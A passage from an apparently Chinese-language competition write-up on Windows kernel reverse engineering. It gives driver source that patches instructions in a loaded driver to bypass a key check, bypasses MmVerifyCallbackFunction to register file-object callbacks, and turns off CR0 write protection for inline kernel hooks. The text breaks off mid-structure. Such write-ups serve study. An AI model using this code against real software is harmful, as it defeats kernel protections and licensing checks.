PVOID QueryNameProcedure;</span><br><span class="line">    <span class="comment">/*0x068*/</span>     PVOID OkayToCloseProcedure;</span><br><span class="line">&#125;OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span>                 // 7 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>                                    // 3 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span>                               // 5 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="comment">/*0x000*/</span>             UINT64       Locked : <span class="number">1</span>;         <span class="comment">// 0 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x000*/</span>             UINT64       Waiting : <span class="number">1</span>;        <span class="comment">// 1 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x000*/</span>             UINT64       Waking : <span class="number">1</span>;         <span class="comment">// 2 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x000*/</span>             UINT64       MultipleShared : <span class="number">1</span>; <span class="comment">// 3 BitPosition</span></span><br><span class="line">            <span class="comment">/*0x000*/</span>             UINT64       Shared : <span class="number">60</span>;        <span class="comment">// 4 BitPosition</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/*0x000*/</span>         UINT64       Value;</span><br><span class="line">        <span class="comment">/*0x000*/</span>         VOID*        Ptr;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MY_OBJECT_TYPE</span>                   // 12 <span class="title">elements</span>, 0<span class="title">xD0</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*0x000*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">TypeList</span>;</span>              <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x010*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">Name</span>;</span>              <span class="comment">// 3 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x020*/</span>     VOID*        DefaultObject;</span><br><span class="line">    <span class="comment">/*0x028*/</span>     UINT8        Index;</span><br><span class="line">    <span class="comment">/*0x029*/</span>     UINT8        _PADDING0_[<span class="number">0x3</span>];</span><br><span class="line">    <span class="comment">/*0x02C*/</span>     ULONG32      TotalNumberOfObjects;</span><br><span class="line">    <span class="comment">/*0x030*/</span>     ULONG32      TotalNumberOfHandles;</span><br><span class="line">    <span class="comment">/*0x034*/</span>     ULONG32      HighWaterNumberOfObjects;</span><br><span class="line">    <span class="comment">/*0x038*/</span>     ULONG32      HighWaterNumberOfHandles;</span><br><span class="line">    <span class="comment">/*0x03C*/</span>     UINT8        _PADDING1_[<span class="number">0x4</span>];</span><br><span class="line">    <span class="comment">/*0x040*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span> <span class="title">TypeInfo</span>;</span> <span class="comment">// 25 elements, 0x70 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x0B0*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">TypeLock</span>;</span>            <span class="comment">// 7 elements, 0x8 bytes (sizeof)</span></span><br><span class="line">    <span class="comment">/*0x0B8*/</span>     ULONG32      Key;</span><br><span class="line">    <span class="comment">/*0x0BC*/</span>     UINT8        _PADDING2_[<span class="number">0x4</span>];</span><br><span class="line">    <span class="comment">/*0x0C0*/</span>     <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">CallbackList</span>;</span>          <span class="comment">// 2 elements, 0x10 bytes (sizeof)</span></span><br><span class="line">&#125;MY_OBJECT_TYPE, *PMY_OBJECT_TYPE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span>;</span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span>;</span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    LARGE_INTEGER Reserved[<span class="number">3</span>];</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    ULONG BasePriority;</span><br><span class="line">    HANDLE ProcessId;</span><br><span class="line">    HANDLE InheritedFromProcessId;</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_THREAD_INFORMATION</span> &#123;</span></span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    ULONG WaitTime;</span><br><span class="line">    PVOID StartAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    ULONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">    ULONG ContextSwitchCount;</span><br><span class="line">    LONG State;</span><br><span class="line">    LONG WaitReason;</span><br><span class="line">&#125; SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SYSTEM_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    SystemProcessInformation = <span class="number">5</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation 11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID obHandle;</span><br><span class="line">DRIVER_INITIALIZE DriverEntry;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize)</span><br><span class="line">&#123;</span><br><span class="line">    PMDL pMdl = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID pNewAddress = <span class="literal">NULL</span>;</span><br><span class="line">    pMdl = MmCreateMdl(<span class="literal">NULL</span>, pBaseAddress, writeDataSize);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    MmBuildMdlForNonPagedPool(pMdl);</span><br><span class="line">    pNewAddress = MmMapLockedPages(pMdl, KernelMode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pNewAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        IoFreeMdl(pMdl);</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);</span><br><span class="line">    MmUnmapLockedPages(pNewAddress, pMdl);</span><br><span class="line">    IoFreeMdl(pMdl);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">PatchInstr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    UNICODE_STRING name;</span><br><span class="line">    RtlInitUnicodeString(&amp;name,<span class="string">L&quot;Loader.sys&quot;</span>);</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        <span class="keyword">if</span> (RtlEqualUnicodeString(&amp;Tmp-&gt;BaseDllName, &amp;name,FALSE)) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;DLLname:%S DLLBase=%p nowcode=%p\n&quot;</span>), Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG64)(Tmp-&gt;DllBase) + <span class="number">0xa27e</span>);</span><br><span class="line">            <span class="type">char</span> buffer[] = &#123; <span class="number">0x90</span>,<span class="number">0x90</span> &#125;;</span><br><span class="line">            MDLWriteMemory((ULONG64)(Tmp-&gt;DllBase) + <span class="number">0xa27e</span>, buffer, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件回调</span></span><br><span class="line">OB_PREOP_CALLBACK_STATUS <span class="title function_">FileObjectpreCall</span><span class="params">(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING DosName;</span><br><span class="line">    PFILE_OBJECT fileo = OperationInformation-&gt;Object;</span><br><span class="line">    HANDLE CurrentProcessId = PsGetCurrentProcessId();</span><br><span class="line">    UNREFERENCED_PARAMETER(RegistrationContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (OperationInformation-&gt;ObjectType != *IoFileObjectType)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> OB_PREOP_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤无效指针</span></span><br><span class="line">    <span class="keyword">if</span> (fileo-&gt;FileName.Buffer == <span class="literal">NULL</span> || </span><br><span class="line">        !MmIsAddressValid(fileo-&gt;FileName.Buffer) || </span><br><span class="line">        fileo-&gt;DeviceObject == <span class="literal">NULL</span> || </span><br><span class="line">        !MmIsAddressValid(fileo-&gt;DeviceObject))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> OB_PREOP_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤无效路径</span></span><br><span class="line">    <span class="keyword">if</span> (!_wcsicmp(fileo-&gt;FileName.Buffer, <span class="string">L&quot;\\Endpoint&quot;</span>) || </span><br><span class="line">        !_wcsicmp(fileo-&gt;FileName.Buffer, <span class="string">L&quot;?&quot;</span>) || </span><br><span class="line">        !_wcsicmp(fileo-&gt;FileName.Buffer, <span class="string">L&quot;\\.\\.&quot;</span>) || </span><br><span class="line">        !_wcsicmp(fileo-&gt;FileName.Buffer, <span class="string">L&quot;\\&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> OB_PREOP_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 将对象转为DOS路径</span></span><br><span class="line">    RtlVolumeDeviceToDosName(fileo-&gt;DeviceObject, &amp;DosName);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!wcscmp(fileo-&gt;FileName.Buffer, <span class="string">L&quot;\\card.txt&quot;</span>)) &#123;</span><br><span class="line">        PETHREAD pct=PsGetCurrentThread();</span><br><span class="line">        PVOID addr=*(ULONG64*)((<span class="type">char</span>*)pct + <span class="number">0x450</span>);</span><br><span class="line">        PatchInstr();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//EnumerateKernelThreads();</span></span><br><span class="line">        DbgBreakPoint();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> OB_PREOP_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">EnableObType</span><span class="params">(POBJECT_TYPE ObjectType)</span></span><br><span class="line">&#123;</span><br><span class="line">    PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;</span><br><span class="line">    myobtype-&gt;TypeInfo.SupportsObjectCallbacks = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">UnDriver</span><span class="params">(PDRIVER_OBJECT driver)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(driver);</span><br><span class="line">    ObUnRegisterCallbacks(obHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT Driver, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PLDR_DATA ldr;</span><br><span class="line"></span><br><span class="line">    kprintf((<span class="string">&quot;hello xia0ji233\n&quot;</span>));</span><br><span class="line">    g_Object = Driver;</span><br><span class="line">    OB_CALLBACK_REGISTRATION obRegFileCallBack;</span><br><span class="line">    OB_OPERATION_REGISTRATION opRegFileCallBack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// enable IoFileObjectType</span></span><br><span class="line">    EnableObType(*IoFileObjectType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bypass MmVerifyCallbackFunction</span></span><br><span class="line">    ldr = (PLDR_DATA)Driver-&gt;DriverSection;</span><br><span class="line">    ldr-&gt;Flags |= <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化回调</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;obRegFileCallBack, <span class="number">0</span>, <span class="keyword">sizeof</span>(obRegFileCallBack));</span><br><span class="line">    obRegFileCallBack.Version = ObGetFilterVersion();</span><br><span class="line">    obRegFileCallBack.OperationRegistrationCount = <span class="number">1</span>;</span><br><span class="line">    obRegFileCallBack.RegistrationContext = <span class="literal">NULL</span>;</span><br><span class="line">    RtlInitUnicodeString(&amp;obRegFileCallBack.Altitude, <span class="string">L&quot;321000&quot;</span>);</span><br><span class="line">    obRegFileCallBack.OperationRegistration = &amp;opRegFileCallBack;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;opRegFileCallBack, <span class="number">0</span>, <span class="keyword">sizeof</span>(opRegFileCallBack));</span><br><span class="line">    opRegFileCallBack.ObjectType = IoFileObjectType;</span><br><span class="line">    opRegFileCallBack.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;</span><br><span class="line">    opRegFileCallBack.PreOperation = (POB_PRE_OPERATION_CALLBACK)&amp;FileObjectpreCall;</span><br><span class="line"></span><br><span class="line">    status = ObRegisterCallbacks(&amp;obRegFileCallBack, &amp;obHandle);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">    &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;注册回调错误 \n&quot;</span>));</span><br><span class="line">        status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UNREFERENCED_PARAMETER(RegistryPath);</span><br><span class="line">    Driver-&gt;DriverUnload = &amp;UnDriver;</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序（附件中的XSafe2.sys）先加载，再加载Loader.sys同样可以任意user key加载成功并且不hook任何系统API和文件。</p><img src="/2024/04/22/tencent-race-2024-pre-final/18.png" class=""><h4 id="分析shellcode反复在读取哪个内存地址（2分）"><a href="#分析shellcode反复在读取哪个内存地址（2分）" class="headerlink" title="分析shellcode反复在读取哪个内存地址（2分）"></a>分析shellcode反复在读取哪个内存地址（2分）</h4><p>shellcode加载之后，会检测双机调试</p><p>但是有一定的延迟，说明是主动检测的不是被动触发的，刚好遇上这个题，猜测是检测了一个调试器标志位。</p><p>不过这里感觉是得先确定一下 shellcode 的位置的，因为它带反调，不知道它怎么反调的，突然想到之前一位神仙把蓝屏代码删了导致电脑爆炸，于是我也想效仿一下看看可不可彳亍。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL <span class="string">L&quot;\\??\\xia0ji2333&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">UINT64 BaseAddr=<span class="literal">NULL</span>, DLLSize=<span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start delete device\n&quot;</span>), __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span class="comment">//CreateFile </span></span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Symbol\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;Sym);</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Device\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: end delete device\n&quot;</span>), __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE FileHandler = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* target;</span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = oldcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = newcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG 